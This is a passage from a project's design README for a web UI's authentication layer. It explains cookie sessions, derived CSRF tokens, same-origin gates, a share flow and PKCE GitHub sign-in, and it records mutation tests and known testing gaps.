and a revocation that is a later line SHADOWING an earlier one rather than an absence. The rewrite
forces the lock onto a **side file**, for the reason `internal/write/atomic.go` already records: a
temp-file-plus-rename changes the inode, so a lock on the old one is held on a file nobody is
looking at. Third site, same ruling, not a fourth answer.

Two more rulings that deliberately differ from the journal's:

- **a malformed line is REFUSED, not skipped.** There, an unreadable journal degrades to
  last-known-good because an empty authority is a total outage. Here the content is a set of live
  credentials and the next write rewrites the whole file, so a skipped line is a session silently
  dropped — a user signed out with no error anywhere — and a `Revoke` that reports success having
  rewritten a file that never held the record it was asked to remove.
- **a store that cannot be read refuses every session.** Serving from a remembered copy would be
  serving credentials somebody may have just withdrawn.

## 🔴 Where the fourth backend sits in the chain, and why

`identity.Backends(machine, supabase, cookie, trusted)` — the cookie is **third of four**. The
positional signature did its job: adding it broke every caller until each had decided.

The new rule, beside the two `Chain`'s comment already carried: **every explicitly-presented
credential is tried before the one the browser sends by itself.** An `Authorization` header is
set by a caller who decided to; a cookie is *ambient* — the user agent attaches it to every
request to this origin, including one a different site caused. A request carrying both resolves
as the header's principal. The other ordering lets a stale cookie silently shadow a deliberately
presented credential, and the person debugging it is reading a page rendered for a principal they
did not ask to be.

⚠ It is **not** a CSRF defence: a cross-site request carries no `Authorization` header either, so
the ordering changes nothing there. ⚠ The cookie sits *before* the trusted header because the
latter's precondition is a deployment declaration — satisfied for every caller who can reach the
socket — while a cookie is at least a credential this surface minted for one browser. No
deployment has both; `ui.AuthBackends` refuses the trusted header outright, so that half of the
ordering is a decision recorded before it can be reached.

**`TrustedHeader` is still absent from the UI chain**, and the pin is now taken over the *widest*
chain `AuthBackends` can build — with a cookie backend present — because a pin over the narrowest
would go green for a constructor that forwarded a trusted header only when a cookie was also
supplied.

## 🔴 The two cross-site gates, and why neither is a route class

`Server.ServeHTTP` runs six gates in a fixed order. The two that matter here are **derived from
the METHOD** (`stateChanging`), never opted into by a row:

1. **same-origin**, on every state-changing method, **before** authentication. It compares
   `Origin` against `Host`. That sounds circular and is not: a browser sets `Origin` from the page
   that MADE the request and will not let that page lie, so an attacker's page sends its own
   origin with our host. A **missing `Origin` is refused** — fail-closed, at the cost that a
   `curl` driving this surface must set the header. It runs before auth because that is the only
   thing standing in front of the **public** sign-in row, which by definition has no session to
   carry a token. ⚠ The scheme is deliberately not compared: this process cannot know whether it
   is behind a TLS-terminating proxy without trusting `X-Forwarded-Proto`, which is the
   `TrustedHeader` hazard in miniature.
2. **the per-session CSRF token**, **after** authentication — which is what makes it *reachable*
   rather than shadowed. A token check ahead of the chain would refuse every anonymous request
   first, so "a POST without a token is refused" would pass against a server whose token check did
   nothing at all.

🔴 **A class can only make a route LESS protected**, which is why there are exactly two
(`public`, `content`) and why neither is `csrf`: a per-row opt-in to a security check is a check
somebody forgets to opt a new row into, silently. Each class is spelled out in the hand-written
ledger in `routes_test.go`, so adding a row means writing its class by hand.

🔴 **THE "URL SPACE IS NOT MAPPABLE" PROPERTY IS RETRACTED, AND THE RETRACTED TEXT IS KEPT
BECAUSE IT WAS THE STATED REASON FOR A DESIGN.** It read: *"Before Phase B every path but
`/healthz` answered the same uniform 401, so an unauthenticated caller could not tell a route
from a typo. `GET /sign-in` answers 200 to anybody — the URL space is now mappable to the extent
of the two public rows … `GET /` was not made to redirect to `/sign-in`, though that is the
browser-friendly thing: a 303 for `/` beside a 401 for `/admin` is exactly the enumeration the
uniform answer prevents."*

The premise is void, and it was void when it was written: **this repository is PUBLIC and
`routes.go` publishes every row.** The map is the source file, and `cairn-ui`'s startup line
already counts it. So the guard was paying a real cost — a browser landing on a mistyped path was
told it was *unauthorized*, and "this is not a route" was indistinguishable from "your credential
is wrong" in this surface's own tests — for a property an attacker could get by reading the repo.

What replaced it, and what was deliberately kept:

- an undeclared path is now **404 with the `noSuchRoute` body**, and
  `TestEveryServedPathComesFromTheLedger` asserts both. That is a *stronger*
  anti-stale-handler assertion than the 401 was: a stale handler renders HTML, redirects, or
  answers 200, and cannot produce either of those. The `GET /entries` probe — a path that WAS a
  row — is still in the list, and it is why the test exists.
- **the uniform refusal for a BAD CREDENTIAL stays**, and that was always the half worth its
  cost: it is an oracle over the credential TABLE, not over the URL space. No refusal on this
  surface says which part of a credential was wrong.
- an unauthenticated caller still cannot tell *most* routes from a typo, because gate (4) runs
  before gate (5) — a consequence of the gate ORDER rather than a guard anybody maintains.
  ⚠ **Not the root**, and this bullet said otherwise in its first draft: a browser asking for `/`
  gets 303 where `/nonsense` gets 401, so exactly one path is distinguishable without a
  credential. It is the path a sign-in flow has to advertise anyway, and it discloses that `/`
  exists — never anything about who may see it.
- **`GET /` DOES redirect a browser now**, 303 to `/sign-in`, on an operator decision. It is
  scoped to one path, one method and an `Accept` carrying `text/html`; every other path, method
  and client keeps the uniform 401 byte for byte, so the machine contract is unmoved.
  `TestTheRootRedirectsABrowserAndRefusesEverythingElse` probes each of those three dimensions
  with the other two held at the redirecting value.

## 🔴 The CSRF token is derived, not stored

`CSRFTokenFor(id) = base64url(HMAC-SHA256(key = the session id, msg = "cairn-csrf-v1"))`. No second
secret, no second stored field, and three properties fall out:

- **computable from the COOKIE and nothing else.** A cross-site attacker can make the browser
  *send* the cookie but not *read* it (`HttpOnly` stops script, the same-origin policy stops a
  response being read), so they cannot derive the token. That is the whole CSRF property.
- **not computable from the STORE.** The store holds `sha256(id)`, and a digest is not a key — so
  somebody who reads the session file cannot mint a token. A stored random token would have made
  that file a forgery kit.
- **rotates and dies with the session for free.**

⚠ It is rendered into the page on purpose; that is what a hidden form field is. Disclosing a MAC
does not disclose its key. `hmac.Equal` compares it, and **there** constant time is load-bearing:
the presented value is chosen by the requester, so an early-returning comparison is an oracle
anybody can drive — submit, measure, extend by one byte, repeat.

## The cookie, and one unverified claim

`__Host-cairn-session`, `HttpOnly`, `Secure` (unconditional), `SameSite=Lax`, `Path=/`, no
`Domain`. Each flag refuses something specific rather than being good practice — see
`session.go`. Two are worth repeating here:

- `Secure` has **no opt-out**, because an env var to disable it for local development is a
  variable that ends up set in production.
- `SameSite=Lax` rather than `Strict` so an ordinary link into the surface still works, and it is
  **not** treated as the guard: it is a browser-side property this server cannot verify, and
  "same site" still includes a sibling subdomain.

🔴 **`__Host-` and the `Secure`-on-`http://localhost` allowance are claims about BROWSERS and
nothing here has measured either.** The prefix's value is that a sibling host cannot plant a
cookie we will honour — session fixation performed entirely outside this process, invisible to
every guard in this package. Its failure direction is safe (a browser that ignores the prefix
treats it as an ordinary name), so being wrong costs a guard we thought we had, not an opening.

## The seven properties, each proven RED

Every mutant below was confirmed to **BUILD** first — a mutant that dies at the compiler proves
nothing — and each is asserted to fail with **its own message**, because a kill by a different arm
is a misattribution that reports a deleted check as covered.

| # | property | mutant | killed by, with its own message |
|---|---|---|---|
| 1 | cookie flags | `HttpOnly: true` → `false` | `…does not carry HttpOnly` (constructor **and** real sign-in) |
| 1 | | `Secure: true` → `false` | `…does not carry Secure` |
| 1 | | `SameSiteLaxMode` → `SameSiteNoneMode` | `…does not carry SameSite=Lax` |
| 2 | CSRF | the gate `if false && …` | `THE STATE CHANGE WAS PERFORMED` |
| 2 | | `csrfTokenValid` → `return true` | `THE STATE CHANGE WAS PERFORMED` |
| 2 | | the HMAC keyed on the LABEL instead of the id | `…derive the SAME CSRF token` |
| 3 | comparison | `hmac.Equal` → `==` | `NO \`hmac.Equal\` CALL REMAINS` |
| 3 | | `subtle.ConstantTimeCompare` → `==` (plus the import) | ``NO `subtle.ConstantTimeCompare` CALL REMAINS`` |
| 3 | scan | a `break` on match | `THE SCAN SHORT-CIRCUITS` — now **structural**, naming `break` and its line |
| 3 | scan | an early `return` on match | `THE SCAN SHORT-CIRCUITS` — naming `return` and its line |
| 3 | entropy | `SessionIDBytes` 32 → 16 | `SessionIDBytes is 16, want 32` |
| 4 | expiry | `Live` → `return true` | `AN EXPIRED SESSION WAS SERVED` |
| 4 | | `now.Before(exp)` → `!now.After(exp)` | `the expiry instant itself` |
| 5 | logout | `Revoke` becomes a no-op | `THE REVOKED COOKIE STILL AUTHENTICATES` |
| 5 | | a process-local memo absorbs revocations but not creations — a **Create-persists / Revoke-doesn't hybrid**, narrower than any option priced above | `THE REVOKED SESSION CAME BACK AFTER A RESTART` |
| 6 | fixation | the sign-in revocation removed | `THE PRE-SIGN-IN SESSION IS STILL LIVE` |
| 7 | secrets | the session id added to the sign-in log line | `THE LOG CONTAINS the session id` |
| 7 | | the submitted token echoed into the refusal page | `THE REFUSED SIGN-IN PAGE CONTAINS the wrong credential` |
| — | origin gate | `if false && …` | five arms, `want 403` |
| — | | a missing `Origin` accepted | `no Origin header at all` |
| — | chain order | the cookie appended FIRST | `…resolved to … the COOKIE's principal` |
| — | UI chain | `AuthBackends` forwards a live `TrustedHeader` | `THE UI CHAIN CONTAINS 1 *identity.TrustedHeader MEMBER(S)` |
| — | authority | the content route skips `Source.Visible` | `…rendered a page WITHOUT consulting the <name> authority it answers from` |
| — | ledger | an undeclared `public` row added | `the declared route set is …` |
| — | class | a second HTML route added WITHOUT the `content` class | `GET /dup answers 200 with an HTML body and is NOT classed \`content\`` |
| — | class | the one content route's class removed | `NO route in the ledger carries the \`content\` class` (the vacuity arm) |

**26 mutants, 26 killed, 0 survived**, after two were re-cut and one property changed instrument:

- 🔴 **THE SCAN GUARD IS NOW STRUCTURAL, AND THAT IS A DELIBERATE TRADE RATHER THAN A LOSS.**
  `TestTheSessionScanDoesNotShortCircuit` measured the property with a `comparisons atomic.Int64`
  field on `FileSessionStore` — an instrument in the SERVING path, incremented once per record on
  every request by every replica, existing for one test. The field is deleted; the property is now
  pinned by `TestTheLookupScanHasNoEarlyExit`, which parses `sessionstore.go` and refuses a
  `break`/`continue`/`goto`/`return` inside `Lookup`'s digest loop. **Four arms, all confirmed to
  BUILD first:** a `break` and an early `return` each fail with `THE SCAN SHORT-CIRCUITS` naming the
  statement and its line; rewriting the `range` as an index loop and replacing `digestsEqual` with
  `==` each fail the guard's own POSITIVE CONTROLS ("contains no `range` statement at all" / "does
  not call `digestsEqual`"), because "found no `break`" and "found no loop" are otherwise the same
  green. ⚠ **What it cannot see, stated:** it pins the loop's ITERATION COUNT — what the counter
  measured — and not the per-iteration COST, so a body whose work depends on whether *this* record
  matched would leak the same fact with no branch statement anywhere. That half is `digestsEqual`'s
  and row 3's `subtle.ConstantTimeCompare` guard's. Moving the scan out of `Lookup` is *not* in the
  gap: the positive controls fire when the `range` or the `digestsEqual` call leaves the function.

- 🔴 **one mutant was REFUSED A KILL BY THE PAIR ASSERTION, and that is the finding.** The first
  "logout is not durable" mutant skipped the rename entirely — which breaks *creation* too, so
  `TestLogoutRevokes…` failed on its OTHER arm (*the untouched session did not survive the
  restart*) rather than on the revocation one. The pair assertion exists precisely so a store that
  refuses everything cannot score a kill, and it worked. It was re-cut as the memo above, which is
  narrower **and more faithful**: creation persists, revocation does not. ⚠ That row used to call the
  re-cut "**option (d) in one edit**", which was wrong and is corrected: (d) is in-memory-only, where
  **neither** create nor revoke persists. The re-cut is a Create-persists / Revoke-doesn't hybrid —
  *narrower than any option that was priced*, which is the entire point of re-cutting it, and the old
  label threw that away.
- one mutant initially **did not build** (dropping the `subtle` call left its import unused) and
  was re-cut to remove both.

### 🔴 The CSRF reachability proof, stated separately

Every arm of `TestTheCSRFGuardIsReachedByAnAuthenticatedRequest` is **authenticated** (a real
sign-in, a real cookie) and carries a **correct `Origin`**, so gates (1)–(5) cannot refuse it and
the only thing left is gate (6). Each arm asserts three things rather than "it was refused":

1. the status is **403, not 401** — a 401 would mean the *authentication* chain refused it, making
   the test evidence about the chain;
2. the body is **`csrf token missing or invalid`, not `cross-site request refused`** — the two
   gates answer the same status and a test reading the status alone would score one as the other;
3. the state did **not** change — the session is still live afterwards, because a refusal that
   performs the action is worse than no gate.

And the **positive control runs first**: that exact request *with* a valid token must answer 303,
or every refusal below it is about a route that never works. The five arms are: no token, an empty
token, another session's well-formed token, the token with one character changed, and the session
id itself presented as the token.

### The env-ledger question, measured

Phase B adds `CAIRN_UI_SESSION_FILE` and `CAIRN_UI_SESSION_TTL`, and both are read by
`cmd/cairn-ui` — like `CAIRN_UI_HOST`/`CAIRN_UI_PORT` already are — **not** by `internal/identity`,
so neither belongs in that package's ledgers. `identity.FromEnvironment` passes `nil` for the
cookie backend, deliberately: the pod is an API with no way to *set* a cookie, and a pod resolving
a session it could never issue would be honouring a credential minted by a different binary against
a store it does not own.

🔴 **The ledger guard WAS checked for the failure the task warns about, rather than assumed.** An
extra exported `Env*` constant declared in neither ledger was added, and
`TestTheEnvironmentLedgersNameEveryVariableEachBackendReads` went **RED** naming it
(`the ledgers and the constants disagree … CAIRN_UI_SESSION_FILE`), GREEN on restore. It reads the
constants out of the package's own **source**, which is what lets it see the set GROW; the
hand-written list it replaced could only ever have seen it shrink.

⚠ `cmd/cairn-ui`'s `envDuration` falls back on an unparseable value rather than refusing, matching
`envInt` beside it and **not** matching `internal/identity`'s ledger, which refuses a mistyped
duration. Left consistent with its neighbours rather than made a one-off; the divergence between
this program's ad-hoc environment reads and that package's ledger is a thing to close in one
change, not here.

### 🔴 The guard this change could itself have emptied, and how it was closed

**Twice now, and the second one is the review round's own edit.** Deleting the `comparisons`
counter deletes the *only* measurement of "the scan does not short-circuit" — the exact shape this
heading exists for. It was checked rather than assumed: the package's other tests were run against a
`break` mutant with the counter test already gone, and **only** the new structural guard noticed, so
nothing else was silently carrying the property. The guard is proven red on `break` and on `return`,
and its two positive controls are proven reachable. What was NOT preserved is the behavioural
observable; that is recorded beside the mutant table and in `Lookup`'s own comment rather than left
for the next reader to find.

`TestEveryContentRouteConsultsTheAuthority` used to walk **every** declared route. Phase B made
it walk only the rows that declare themselves `content` — which is a hole in the shape this
repository names: a new page route added *without* the class is skipped by the walk, and the
hand-written ledger test passes for a row written out with no class at all. Two rows, two
guards, and nothing requiring the second to ask the authority.

It is closed by **deriving** the class rather than trusting it: every non-public `GET` that
answers 200 with an HTML body **is** a content route, whatever its class says, and must carry the
class. Proven red at both ends — the derivation arm fires on a second HTML route added without the
class, and the vacuity arm fires when the only content route loses its.

The other narrowing is declared rather than closed: `TestAnUnauthenticatedRequestReachesNoRenderer`
now skips public rows, with a `checked == 0` fatal so a tree in which *every* row went public
cannot pass it silently. And `{"POST", "/"}` moved out of the undeclared-path probe list into a
new one that sets a correct `Origin`, because gate (2) now runs before the ledger and the probe
would otherwise have passed with the ledger deleted.

## What Phase B's tests still structurally cannot see

Everything in Phase A's list still applies, and three of them now matter more:

- 🔴 **A REAL BROWSER. Nothing in this repository has been driven against one, at any phase.**
  Every cookie assertion is over a rendered `Set-Cookie` header; `HttpOnly`, `Secure`, `SameSite`
  and the `__Host-` prefix are all enforced **by the browser**, so what is measured here is that
  the server *asks* for them. Nothing measures that a browser honours the ask.
- **Concurrency is now partly covered and not fully.** `go test -race ./...` is clean over 19
  packages, and `FileSessionStore` takes a process mutex ahead of an exclusive `flock` — but no
  test drives two requests at the same instant, and no test runs two *processes* against one
  session file. The cross-process claim rests on `flock` plus rename atomicity, argued from the
  same reasoning `control.FileStore.Append` records, not measured here.
- **The `nix` check sandbox still pins dimensions.** `checks.go-client-declares-its-verbs` and the
  UI derivation's own check phase have no store, no token, no network and no HOME; the session
  tests use `t.TempDir()` and run inside `go test`, so they DO exercise a real file — but nothing
  exercises a real deployment, a mounted volume, or the `/var/lib/cairn-ui` default path.
- **Login CSRF beyond the origin gate.** The public sign-in form carries no token because there is
  no session to derive one from; the same-origin gate is the whole defence there, and it is a
  browser-behaviour claim in the same way the cookie flags are.
- 🔴 **A SESSION VOLUME THAT VANISHES *AFTER* START.** `cmd/cairn-ui/main.go` refuses to start when
  the session table cannot be opened — correct, and it says why — but `/healthz` answers `ok`
  unconditionally ahead of the whole chain (`internal/ui/server.go`), so a replica that loses its
  session volume after startup **passes readiness and refuses every login**: exactly the shape the
  startup refusal exists against, arriving by the one route the refusal cannot cover. Nothing here
  measures it, and nothing in this PR changes it.

# Phase C — the share flow

Three routes (`GET /share`, `POST /share`, `POST /unshare`), one new seam (`Sharing`), and one
sentence pinned whole. This is the clause the control-plane arc's closing condition names: *a
scope granted from one user to another, served through the browser, with its replica-honesty
notice pinned by a test.*

## 🔴 "Who has access to this" is computed from `control.Resolve`, never from `Model.Grants`

Authority arrives **two ways** — `control.Resolve`'s own comment enumerates them — and only one of
them is a grant row:

1. **Ownership.** A user who is a member of the project owning a scope reaches it at their role's
   verbs, with **no grant row anywhere in the journal**.
2. **Sharing.** A live grant names the principal, or a project they belong to.

A page that answered "who has access to this" from the grant table would **under-report every project
member**, and silently: the list would be short, plausible, and wrong in the direction that tells
somebody their notes are more private than they are. `ControlSharing.Audience` therefore resolves
**every principal the model holds** and asks `VerbsOn(scope)`. That is O(principals × grants log
grants) per page against the grant read's O(grants); the cost is accepted and the reason is written
beside the function. ⚠ **The measurement now EXISTS** — `BenchmarkAudience` re-derives it; see `Audience`'s comment.

`Revocable` **is** read from the grant table, and that is the other half of the decision: grants
are the only thing this surface can take back. The two lists render separately with a sentence
between them saying why, because a reader who revokes every row and expects the audience to empty
has misunderstood the model.

`TestTheAudienceIsComputedFromResolveNotFromGrantRows` pins it with a viewer who holds authority
and **no grant row at all**, and asserts the grant table is empty first — without that second
assertion a grant-reading implementation could pass.

## 🔴 The replica-honesty notice is pinned as ONE NORMALISED STRING

`ReplicaHonesty` is a constant and `TestTheReplicaHonestyNoticeIsPinnedWhole` compares the rendered
page against the whole of it, with HTML entities resolved and whitespace collapsed. A guard on
keywords — "the page mentions `cache`" — survives a reword that has quietly dropped a clause, and
the clause a well-meaning edit drops is always the one that makes the product sound weakest. The
cost is that **any** cosmetic reword reds the test. That is the intended cost.

Each of its three clauses is a fact measured elsewhere in this tree:

| clause | what makes it true |
|---|---|
| "one replica's answer, read from a cached copy of the authority" | `control.Cache` is stale by design up to its declared `MaxAge`; `cairn-ui` is single-replica — see `identity.FileSessionStore`, whose own comment states it. ⚠ This cell ended "the `ui-image` derivation now exists but nothing publishes or deploys it"; the image is published and deployed, and the single-replica limit rests on the session table rather than on that |
| "another reader gains or loses the scope when their own cache next refreshes" | `control.Cache.ApplyNow`'s promise is explicitly about THIS process |
| "does not recall entries already copied onto somebody's machine" | `ApplyNow` says it in as many words |

It carries **no number**. A "within 30 seconds" would be a promise about a refresh interval this
package does not own and an operator can change; the bound that IS known travels per write, as
`Effect.EffectiveBy`, and `control.EffectDeferred`'s own comment makes rendering it mandatory
rather than stylistic.

## The decisions, and what each one costs

- **The scope is a QUERY PARAMETER, not a path segment.** `routes` is an exact-match map; a path
  parameter means a prefix match, and a prefix match is a second way to reach a handler that
  `TestEveryServedPathComesFromTheLedger` structurally cannot probe — there is no longer a finite
  set of paths to probe.
- **`/unshare` is its own path, not an `action=` field on `/share`.** A hidden action field makes
  the difference between granting and revoking a value chosen by whoever gets one request past
  both cross-site gates. Two paths make the two writes two rows in the ledger.
- **The recipient is a `select` over `Candidates`, and `Candidates` is the actor's own
  collaborators.** A picker over every user turns admin on one scope into a directory of everybody
  in the deployment. 🔴 **The cost is real and is not hidden: sharing with somebody you have no
  project in common with is NOT REACHABLE from this page.** Lifting that is an invite flow (P6).
- **The handler re-validates the chosen subject against the same list.** A `select` constrains a
  browser, not an HTTP client.
- **A revocation is authorised from the GRANT ROW, never from the form.** The grant id is the only
  thing that says which scope a revocation touches. Passing a scope alongside it would let a caller
  with admin on scope A revoke a grant on scope B.
- **The outcome after a write is a CODE from a closed set, not a sentence.** A write redirects so a
  refresh does not repeat it, and a redirect target is something anybody can put in a link. A
  reflected sentence is not an XSS bug and is still an attack: the escaper turns markup into text
  and has nothing to say about this page presenting an attacker's sentence as its own. The only
  caller-supplied value that reaches the banner is an instant this code parsed and re-formatted.
- **An unknown scope and an unauthorised one answer identically**, status and body. A 404 beside a
  403 is an existence oracle over every scope in the deployment.

## 🔴 A read-only deployment says so on the PAGE, and the first draft of that test SKIPPED

`cairn-ui` gained a `-control-journal` flag. With it the authority is a `control.FileStore` and a
share can be recorded; without it the authority is the token-file projection and it cannot. The
flag **switches** the authority rather than adding one — two authorities would be two answers to
"who may see what".

🔴 **BECAUSE IT SWITCHES THE AUTHORITY, `CAIRN_UI_CONTROL_JOURNAL` IS THE ONE VARIABLE THIS BINARY
READS RAW RATHER THAN THROUGH `internal/envalias`.** `envalias` reads a whitespace-only value as
ABSENT, which for a listen address is a default and for this name is a silently different
authority — the token-file projection, which confers `admin` on nobody. `cmd/cairn-ui`'s
`controlJournalDefault` refuses it instead, the ruling `cmd/cairn-server`'s `controlJournalPath`
already makes for the pod. Numbers, the two-binary measurement and what the other four `CAIRN_UI_*`
names do with whitespace: `tests/conformance/README.md`, the blank-policy section. No copy of them
here, deliberately.

The first version of this feature reported the read-only condition only when somebody clicked
Share, and its test asserted a 501. **That test skipped, and the skip is why the design changed:**
`internal/control/tokenfile` grants **no `admin` verb to anybody** — its own comment says the token
file "has no sharing to administer" — so on such a deployment the authority check refuses first and
the 501 arm is never reached. A skip nobody counts is a pass. So `control.Cache` gained `Writable()`
(derived from the same type assertion `write` already made, not a second one), the page announces
`ReadOnlyAuthority` on every load, and two tests replace the one that skipped: one measures the
sentence on a real token-file deployment **and** asserts a journal-backed deployment does not
render it; the other pins the 501 mapping through the real dispatcher and **says plainly that it
drives the condition through a fixture**, because no authority in this tree is both read-only and
able to confer admin.

## The mutation rows — in `tests/control_mutants.py`, which CI runs

🔴 **THERE IS NO SEPARATE BATTERY FOR THIS PACKAGE, AND THE ONE THAT BRIEFLY EXISTED IS THE
LESSON.** The share flow shipped with `tests/ui_share_mutants.py` — 234 lines, a second copy of
`control_mutants.py`'s harness — and **no gate ran it**: `grep -l ui_share_mutants` over the whole
tree returned the file and one line of this README, while `control_mutants` is a step in
`.github/workflows/ci.yml` and is pinned by `tests/test_control_mutant_count_is_pinned.py`. It also
mutated the LIVE working tree where that harness mutates a `copytree`. Round 0 of #64's audit found
it. The eight rows moved into `control_mutants.py` (the `ui-` prefixed ones), `./internal/ui/`
joined its `PKGS`, and the file is deleted — so the rows now get the CI step, the isolation and the
count pin that the copy would have had to re-earn. **A second battery is a second thing to remember
to run.**

| row | killed by |
|---|---|
| `ui-audience-reads-grant-rows-instead-of-Resolve` | `TestTheAudienceIsComputedFromResolveNotFromGrantRows` |
| `ui-replica-notice-drops-a-clause` | `TestTheReplicaHonestyNoticeIsPinnedWhole` |
| `ui-verbs-read-single-value` | `TestEveryTickedVerbReachesTheGrant` |
| `ui-share-subject-accepted-from-the-form` | `TestTheSubjectIsValidatedAgainstCandidates…` |
| `ui-unshare-skips-the-objects-authority-check` | `TestARevokeIsAuthorisedFromTheGrantRatherThanFromTheForm` |
| `ui-share-page-skips-its-authority-check` | `TestTheSharePageRefusesAScopeThisCallerCannotAdminister` |
| `ui-page-never-reports-a-read-only-authority` | `TestAReadOnlyDeploymentSaysSoOnThePage…` |
| `ui-share-write-authority-check-removed-in-the-handler` | `TestTheSharePageRefusesAScopeThisCallerCannotAdminister` (its no-verb arm) |

🔴 **THAT LAST ROW WAS LABELLED `EQUIVALENT` AND THE LABEL WAS MEASURED FALSE — the
retracted argument is kept here because an EQUIVALENT label is exactly what stops anybody
writing the test that kills the mutant.** It read: *"Removing either alone is observably
equivalent: the other still answers 403 with the same body … Both sites call the same
predicate, so this is one rule at two call sites, not two rules."*

The discriminator it missed is a request with **no `verb` field**. The handler's
`Allows(scope, VerbAdmin)` runs BEFORE the form is validated, so:

| tree | status |
|---|---|
| unmutated | **403** — refused on authority, disclosing nothing about the input |
| the handler's check removed | **400** — the caller reaches verb validation and learns their input was the problem |

So the two sites are **not** redundant, and the row is an ordinary killable one.
`TestTheSharePageRefusesAScopeThisCallerCannotAdminister` carries that exact case.

⚠ **AND THIS PARAGRAPH IS THE SECOND HALF OF THAT RETRACTION, WRITTEN A ROUND LATE.** The
round that retracted the label did it in `tests/control_mutants.py` and
`internal/control/README.md` and left this file arguing the refuted case — under a 🔴, in
the first place a reader of `internal/ui` looks, telling them a check the same round had
just proved load-bearing was redundant. Its own commit message said *"a retraction is a
TREE-WIDE SWEEP, not an edit at the site you happened to be reading"*. Four retractions in
that commit were swept at one site each.

⚠ **The split is not restated here.** `internal/control/README.md` carries the battery's
`mutants / killed / EQUIVALENT` line and is the only place pinned to it; a second copy here is the
count that goes stale.

## What Phase C's tests still cannot see

Everything Phase A's and Phase B's lists say still applies, plus:

- 🔴 **NO TEST DRIVES TWO ACTORS AT THE SAME INSTANT.** Two admins sharing and revoking one scope
  concurrently is argued from `control.FileStore.Append`'s own locking and is not measured here.
  `go test -race` is clean over the package; that is a different claim.
- **The audience is not measured at scale.** Its cost is O(principals × grants log grants) per page
  and the largest fixture holds three users. Nothing here would notice it becoming slow.
- **`Candidates` is measured over one shape of membership** — two users in one common project.
  Nested or overlapping memberships beyond that are untested.
- 🔴 **A GRANT WHOSE OBJECT IS A PROJECT IS VISIBLE AND NOT REVOCABLE HERE**, deliberately: revoking
  it from a page about one scope would silently withdraw every other scope that project owns. There
  is no project page, so today there is **nowhere in this surface** to revoke one. Stated as a gap
  rather than left for somebody to find by hunting for a button.
- 🔴 **THIS BULLET IS RETRACTED, AND THE RETRACTION IS THE ENTRY.** It read: *"Nothing measures a
  real deployment. `packages.ui-image` now BUILDS an image — and a build is not a deploy: nothing
  publishes it and there is still no manifest, so `-control-journal` has been exercised by tests and
  by nothing else."* **All three clauses are now false.** The image is PUBLISHED, a manifest deploys
  it from the operator's GitOps repository (not this one — which is why "there is still no manifest"
  was never a measurement of anything), and the surface is LIVE and public, serving a cookie session
  against a real store. What survives as a genuine gap is narrower and is worth keeping separately:
  **no test in this repository drives the deployed instance**, so every guard here is a claim about
  the code and none is a claim about what is running. The distance between those two is what
  `AGENTS.md`'s "deployed ≠ verified" rule is about.

# Phase D — GitHub sign-in through the operator's Supabase/GoTrue

The sign-in page grows a **second door**. The credential form is unchanged and is not
optional; what is new is a `Sign in with GitHub` button, an authorization-code flow with
PKCE, and two rows in the ledger.

## 🔴 The credential form SURVIVES, and that is a requirement rather than a courtesy

Three independent reasons, and any one of them is enough:

- **It is the door that verified this deployment.** The surface went live and served its scopes
  to a cookie session minted by pasting a credential token into `[name=token]`.
- **It is the only door that works when the identity provider is down.** The JWKS is cached
  and an already-issued session survives an outage — `SupabaseJWT`'s own comment measures
  that — but a *new* sign-in through the provider does not.
- **A browser evaluation harness drives it, and cannot drive OAuth.** The provider flow is
  cross-origin to a third party with MFA, so nothing automated completes it. The alternative
  — a test-only authentication bypass — is exactly what `identity.SessionCookie`'s comment
  argues against: *"an env var to turn it off for local development is a variable that ends up
  set in production."*

`TestTheCredentialFormSURVIVESTheProviderButton` pins the **selector**, not the word: exactly
one field named `token`, a `password` input, a form posting to `SignInPath` — on a deployment
with a provider and on one without — and then it drives a real credential through to a 303 plus
a session cookie.

## 🔴 PKCE with a server-side exchange, and NO `state` parameter

The flow is: `POST /sign-in/github` → 303 to GoTrue's `/authorize` carrying
`code_challenge` + `code_challenge_method=s256` + `flow_type=pkce` → the provider redirects to
`GET /sign-in/github/callback?code=…` → this process POSTs `/token?grant_type=pkce` with the
code and the verifier → the returned access token is **verified through
`identity.SupabaseJWT`** → the SAME cookie session the token form mints.

Two decisions inside that are worth reading twice.

**`flow_type=pkce` is what keeps the flow scriptless.** Without it GoTrue returns the access
token in the URL **fragment**, which no server ever receives: the page would need script to
read `location.hash` and post it back. That is more code, a second way in, and a token in the
browser's history. A draft of this change carried `script-src 'self'`, which would have
permitted such a script — the flow was available and was refused.

⚠ **THAT PARAGRAPH'S SECOND HALF IS RETIRED, AND THE DECISION IT DESCRIBES IS NOT.** It read
*"That clause is gone too: having deliberately built the flow scriptless, keeping a directive
that re-permits script 'for later' would be the policy-wider-than-the-code shape this surface
refuses."* There is no policy left to be wider than the code — the whole header was deleted by
operator decision, so **nothing in a browser forbids script here any more**. The scriptless flow
stands on the half that never depended on a header: a token in the fragment is a token in the
browser's history that the server never receives, and a flow needing script to complete is a
second way in. `internal/identity/supabaseoauth.go` carries the same retraction beside the
`flow_type` parameter. Do not re-derive *"the CSP is gone, so the implicit flow is fine now"*.

**There is no `state` parameter, and its absence is a decision with a reason.** GoTrue does not
pass an arbitrary `state` through to the callback; it manages its own and appends only `code`.
Carrying one would mean smuggling it into the redirect URL's query, which changes the string the
operator's `GOTRUE_URI_ALLOW_LIST` has to match. What `state` buys is a binding between the
callback and the browser that started the flow, and that binding is supplied instead by the
**flight cookie** plus the **PKCE verifier behind it**:

> An attacker who obtains a code of their own and makes a victim's browser open the callback
> loses twice. With no flight cookie there is nothing to exchange with. With the victim's OWN
> flight cookie, the exchange presents the VICTIM's verifier against the ATTACKER's code, which
> the token endpoint refuses.

`TestAFlightIsSingleUseAndBoundToItsBrowser` drives all three arms of that — a replay, a
callback with no cookie, and a planted flight id — and asserts the provider was reached
**once** in total, because a refusal that still costs a network round trip is one anybody can
make this process perform.

## 🔴 Where the PKCE verifier lives, and why it is NOT the durable session store

`internal/ui`'s `flights` table: in memory, keyed by a 32-byte flight id carried in a
`__Host-cairn-oauth` cookie (`HttpOnly`, `Secure`, `SameSite=Lax`, `MaxAge` = the flight TTL),
**single use** (the record is MARKED consumed on read, never deleted — see below), **expiring**
(5 minutes), and **bounded twice**
(`maxFlightsPerClient` = 8, `maxOpenFlights` = 1024).

- **Why not the session store.** `identity/session.go` rejects in-memory storage *for
  sessions* because a restart signs everybody out and a second replica has no shared truth.
  Neither cost lands on a flight: a restart mid-flight costs ONE person ONE retry of a button
  they are looking at. And the durable store would be **worse** — it would write a live PKCE
  verifier to disk, where the whole reason the session table holds `sha256(id)` rather than the
  id is that a file of live credentials is a file worth stealing.
